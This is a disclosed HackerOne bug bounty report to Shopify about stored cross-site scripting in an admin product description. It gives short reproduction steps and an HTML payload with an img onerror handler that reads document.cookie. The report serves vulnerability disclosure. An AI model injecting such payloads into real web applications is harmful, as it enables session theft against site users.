# xss triggered in "myshopify.com/admin/product"

## Report Details
- **Report ID**: 978125
- **URL**: https://hackerone.com/reports/978125
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-09-10T04:06:27.552Z
- **Disclosed**: 2020-09-15T20:30:27.321Z

## Reporter
- **Username**: jaka-tingkir
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
I tried to make a product description and add the xss script in the paragraph.

## steps for reproduction
1. create a new product
2. enter xss in the product description paragraph, such as;
`<div align =" center "data-mce-fragment =" 1 "> <img src = x onerror = prompt (document.cookie)>
<h4 dir = "ltr" data-mce-fragment = "1"> <span style = "text-decoration: underline; color: # ff2a00;"> <em> <strong> (name_product) </strong></em></span> </h4>
</div> ``

## Impact

xss can be triggered

## Attachments
- 1.mp4
